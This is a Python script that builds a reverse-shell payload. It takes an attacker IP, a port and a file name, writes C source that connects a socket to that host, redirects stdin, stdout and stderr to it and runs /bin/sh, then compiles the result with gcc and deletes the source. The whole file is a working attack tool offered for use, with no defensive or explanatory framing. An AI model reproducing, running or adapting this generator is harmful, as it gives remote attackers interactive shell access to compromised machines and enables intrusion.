import os
import sys
import subprocess

ip = sys.argv[1]
port = sys.argv[2]
name = sys.argv[3]
p1 = """#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
"""
p2 ="int port = {0};".format(port)
   
p3 = """ struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
"""
p4 = 'revsockaddr.sin_addr.s_addr = inet_addr("{0}");'.format(ip)
p5 = """
    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}
"""

with open("payload.c","w") as save:
     save.write(p1+"\n"+p2+"\n"+p3+"\n"+p4+"\n"+p5)
     save.close()
     
def comp(name):
    if os.path.isfile("payload.c"):
        proc = subprocess.getoutput("gcc payload.c --output {0}".format(name))
        if len(proc) > 0:
           print(proc)
        else:
           print("[√] Created sucessfully ")

    os.remove("payload.c")
comp(name)
